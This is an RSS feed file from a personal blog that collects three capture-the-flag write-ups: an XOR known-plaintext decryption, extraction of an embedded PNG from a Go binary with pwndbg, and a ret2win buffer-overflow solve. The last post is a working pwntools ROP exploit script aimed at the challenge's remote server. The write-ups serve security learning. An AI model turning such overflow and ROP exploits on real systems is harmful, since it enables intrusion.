@@ -1,0 +1,157 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
+  <channel>
+    <title>Ritsec CTF 2023 on CT</title>
+    <link>http://treseco.github.io/tags/ritsec-ctf-2023/</link>
+    <description>Recent content in Ritsec CTF 2023 on CT</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 23 May 2023 19:01:07 -0400</lastBuildDate><atom:link href="http://treseco.github.io/tags/ritsec-ctf-2023/index.xml" rel="self" type="application/rss+xml" /><icon>http://treseco.github.io/logo.svg</icon>
+    
+    
+    <item>
+      <title>Either or Neither nor</title>
+      <link>http://treseco.github.io/posts/ritsecctf23/either_or_neither_nor/</link>
+      <pubDate>Tue, 23 May 2023 19:01:07 -0400</pubDate>
+      
+      <guid>http://treseco.github.io/posts/ritsecctf23/either_or_neither_nor/</guid>
+      <description><![CDATA[<h3 id="either-or-neither-nor">Either or Neither nor</h3>
+<ul>
+<li>Category: crypto</li>
+<li>Points: 100</li>
+</ul>
+<hr>
+<h4 id="files">Files</h4>
+<p><code>chal.py</code> - Python script, ASCII text executable</p>
+<hr>
+<h4 id="solve">Solve</h4>
+<p>The contents of chal.py tell us that the flag has been xored with a key and we only have the resulting encrypted flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#! /usr/bin/env python </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;XXXXXXXXXXXXXXXXXXXXX&#34;</span> 
+</span></span><span style="display:flex;"><span>enc_flag <span style="color:#f92672">=</span> [<span style="color:#ae81ff">91</span>,<span style="color:#ae81ff">241</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">166</span>,<span style="color:#ae81ff">85</span>,<span style="color:#ae81ff">192</span>,<span style="color:#ae81ff">87</span>,<span style="color:#ae81ff">188</span>,<span style="color:#ae81ff">110</span>,<span style="color:#ae81ff">164</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">152</span>,<span style="color:#ae81ff">98</span>,<span style="color:#ae81ff">252</span>,<span style="color:#ae81ff">34</span>,<span style="color:#ae81ff">152</span>,<span style="color:#ae81ff">117</span>,<span style="color:#ae81ff">164</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">162</span>,<span style="color:#ae81ff">107</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>KEY_LEN <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Encrypt the flag </span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> idx, c <span style="color:#f92672">in</span> enumerate(flag): 
+</span></span><span style="display:flex;"><span>	enc_flag <span style="color:#f92672">=</span> ord(c) <span style="color:#f92672">^</span> key[idx <span style="color:#f92672">%</span> len(key)]
+</span></span></code></pre></div><p>The xor operation has properties that make it simple to reverse. If <code>a ^ b = c</code> then <code>c ^ b = a</code>. Because we have the encrypted flag, and the encrypted bytes are equal to <code>f ^ k</code> where <code>f</code> and <code>k</code> are the flag bytes and the key bytes respectively, we can figure out bytes of the flag from bytes of the key and vice versa. Because we know the flag format is &lsquo;MetaCTF{}&rsquo;, we can find the key by individually xoring the first four bytes of the encrypted flag with the known first four bytes of the flag &lsquo;Meta&rsquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># encrypted flag</span>
+</span></span><span style="display:flex;"><span>enc_flag <span style="color:#f92672">=</span> [<span style="color:#ae81ff">91</span>,<span style="color:#ae81ff">241</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">166</span>,<span style="color:#ae81ff">85</span>,<span style="color:#ae81ff">192</span>,<span style="color:#ae81ff">87</span>,<span style="color:#ae81ff">188</span>,<span style="color:#ae81ff">110</span>,<span style="color:#ae81ff">164</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">152</span>,<span style="color:#ae81ff">98</span>,<span style="color:#ae81ff">252</span>,<span style="color:#ae81ff">34</span>,<span style="color:#ae81ff">152</span>,<span style="color:#ae81ff">117</span>,<span style="color:#ae81ff">164</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">162</span>,<span style="color:#ae81ff">107</span>]
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>] 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># calculate key from enc_flag and known start of flag</span>
+</span></span><span style="display:flex;"><span>key[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> enc_flag[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">^</span> ord(<span style="color:#e6db74">&#39;M&#39;</span>)
+</span></span><span style="display:flex;"><span>key[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> enc_flag[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">^</span> ord(<span style="color:#e6db74">&#39;e&#39;</span>)
+</span></span><span style="display:flex;"><span>key[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> enc_flag[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">^</span> ord(<span style="color:#e6db74">&#39;t&#39;</span>)
+</span></span><span style="display:flex;"><span>key[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> enc_flag[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">^</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># print decrypted flag</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> idx, c <span style="color:#f92672">in</span> enumerate(enc_flag):
+</span></span><span style="display:flex;"><span>    print(chr(c <span style="color:#f92672">^</span> key[idx <span style="color:#f92672">%</span> len(key)]), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>print()
+</span></span></code></pre></div><p>Flag: <code>MetaCTF{x0r_th3_c0re}</code></p>
+]]></description>
+      
+    </item>
+    
+    
+    
+    <item>
+      <title>Jurassic Park</title>
+      <link>http://treseco.github.io/posts/ritsecctf23/jurassic_park/</link>
+      <pubDate>Tue, 23 May 2023 19:01:07 -0400</pubDate>
+      
+      <guid>http://treseco.github.io/posts/ritsecctf23/jurassic_park/</guid>
+      <description><![CDATA[<h3 id="jurassic-park">Jurassic park</h3>
+<ul>
+<li>Category: Rev</li>
+<li>Points: 294</li>
+</ul>
+<hr>
+<h4 id="files">Files</h4>
+<p><code>JuarrasicPark</code> - JurassicPark: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=4XMyVkn0sTek7nw8EEYU/QdfCrifAK-NMKTlAgud5/tWG5xm3UkP6nAyK9dh6I/QDTAn6gKrQy1Vt4Cl8mo, with debug_info, not stripped</p>
+<hr>
+<h4 id="solve">Solve</h4>
+<p>I was not the first on my team to solve this challenge, but didn&rsquo;t notice until I had solved it. I feel it is still worth documenting this method of extracting a file from memory with pwndbg.</p>
+<p>In <code>main</code> we find a call to <code>embed.FS.ReadFile</code> being called on a file called  <code>flag.png</code></p>
+<pre tabindex="0"><code>│       ┌─&gt; 0x0048e500      cmp   rsp, qword [r14 + 0x10]
+│      ┌──&lt; 0x0048e504      jbe   0x48e615
+│      │╎   0x0048e50a      sub   rsp, 0x70
+│      │╎   0x0048e50e      mov   qword [var_8h], rbp
+│      │╎   0x0048e513      lea   rbp, [var_8h]
+│      │╎   0x0048e518      mov   rax, qword obj.main.f
+│      │╎   0x0048e51f      lea   rbx, str.flag.png            ; 0x4a828a 
+│      │╎   0x0048e526      mov   ecx, 8                       ; int64_t arg_20h
+│      │╎   0x0048e52b      call  sym.embed.FS.ReadFile
+	...
+</code></pre><p>running the executable with gdb we can step to the instruction right after the call to <code>ReadFile</code>. $rax now points to the start of the file but we don&rsquo;t know where it ends. The end can be found by searching for the &lsquo;IEND&rsquo; string in memory which will mark the end of PNG files. <code>0x444e4549</code> are the bytes that we are looking for.</p>
+<pre tabindex="0"><code>pwndbg&gt; hexdump $rax
++0000 0xc000070000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  │.PNG....│....IHDR│
++0010 0xc000070010  00 00 03 ba 00 00 00 f9  08 06 00 00 00 09 20 49  │........│.......I│
++0020 0xc000070020  32 00 00 2c ea 49 44 41  54 78 5e ed dd 07 d8 34  │2..,.IDA│Tx^....4│
++0030 0xc000070030  eb 59 17 f0 fb 04 10 01  41 10 42 87 f3 26 48 42  │.Y......│A.B..&amp;HB│
+pwndbg&gt; find $rax, +0xffffffff, 0x444e4549
+0xc000072d1b
+warning: Unable to access 16000 bytes of target memory at 0xc003ffc71f, halting search.
+1 pattern found.
+pwndbg&gt; dump binary memory dump.bin $rax 0xc000072d2b
+pwndbg&gt;
+</code></pre><p>Dumping the memory from $rax to a bit past the &lsquo;IEND&rsquo; string will give us the flag.png and the image contains the flag.</p>
+<p>Flag: <code>RS{G0_3MB3D_TH3_FLAG}</code></p>
+]]></description>
+      
+    </item>
+    
+    
+    
+    <item>
+      <title>ret2win</title>
+      <link>http://treseco.github.io/posts/ritsecctf23/ret2win/</link>
+      <pubDate>Tue, 23 May 2023 19:01:07 -0400</pubDate>
+      
+      <guid>http://treseco.github.io/posts/ritsecctf23/ret2win/</guid>
+      <description><![CDATA[<h3 id="ret2win">ret2win</h3>
+<ul>
+<li>Pwn</li>
+<li>83 pts</li>
+</ul>
+<hr>
+<h4 id="description">Description</h4>
+<blockquote>
+<p>Are you looking for an exploit dev job. Well apply to the Republic of Potatoes. We are looking for the best hackers out there. Download the binary, find the secret door and remember to pass the right password.</p>
+</blockquote>
+<hr>
+<h4 id="files">Files</h4>
+<p><code>ret2win</code> - ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6407290ddc178ebcff6a243a585c21e8c32a440b, for GNU/Linux 3.2.0, not stripped</p>
+<hr>
+<h4 id="solve">Solve</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./ret2win&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal<span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-v&#39;</span>]
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args[<span style="color:#e6db74">&#39;REMOTE&#39;</span>]:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;ret2win.challenges.ctf.ritsec.club&#39;</span>, <span style="color:#ae81ff">1337</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2win&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#p = gdb.debug(&#39;./ret2win&#39;, &#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#    starti</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#&#39;&#39;&#39;)</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2win&#39;</span>)
+</span></span><span style="display:flex;"><span>win <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>supersecrettoplevelfunction
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;(ROP)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)  <span style="color:#75715e">#does not work on remote, buffer not flushed?</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#ae81ff">40</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x4012b3</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0xcafebabe</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x4012b1</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0xc0debabe</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0xffffffff</span>)<span style="color:#f92672">+</span>p64(win))
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>]]></description>
+      
+    </item>
+    
+    
+  </channel>
+</rss>
